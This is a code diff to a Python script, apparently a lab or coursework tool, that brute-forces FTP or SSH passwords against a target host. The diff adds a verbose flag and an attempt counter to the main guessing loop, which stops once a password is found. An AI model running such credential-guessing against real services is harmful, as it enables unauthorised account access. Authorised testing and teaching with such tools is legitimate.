@@ -102,6 +102,12 @@ def parse_arguments():
         default=Path("attempt_log.csv"),
         help="CSV log output path",
     )
+    # Show each attempt while its running live
+    parser.add_argument(
+        "--verbose",
+        action="store_true",
+        help="Show each password attempt while running",
+    )
 
     return parser.parse_args()
 
@@ -244,15 +250,20 @@ def main():
         # Choose correct function dynamically
         attempt_function = attempt_ftp if args.service == "ftp" else attempt_ssh
 
-        # Verify target is operative
+        # Verify target is reachable BEFORE brute forcing
         try:
             verify_service_alive(args.target, port)
         except ServiceUnavailableError as error:
             print(f"[-] ERROR: {error}", file=sys.stderr)
             sys.exit(1)
 
+        # Initialize attempt counter
+        attempt_count = 0
+
         # Main brute loop
         for password in passwords:
+
+            attempt_count += 1  # Count each attempt
 
             try:
                 success = attempt_function(
@@ -263,7 +274,6 @@ def main():
                 )
 
             except ServiceUnavailableError as error:
-                # Stop immediately if service is down
                 print(f"[-] ERROR: {error}", file=sys.stderr)
                 sys.exit(1)
 
@@ -275,19 +285,18 @@ def main():
                 "SUCCESS" if success else "FAIL",
             )
 
-            # Stop immediately on success (important requirement)
+            # Stop immediately on success
             if success:
                 print(f"[+] SUCCESS: Password found: {password}")
                 return
 
-            # Mandatory delay (prevents aggressive behaviour)
+            # Mandatory delay
             time.sleep(0.1)
 
         # If loop finishes with no success
         print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")
 
     except KeyboardInterrupt:
-        # Clean exit if user presses Ctrl+C
         print("\n[-] INTERRUPTED: Execution stopped by user.", file=sys.stderr)
         sys.exit(1)
 
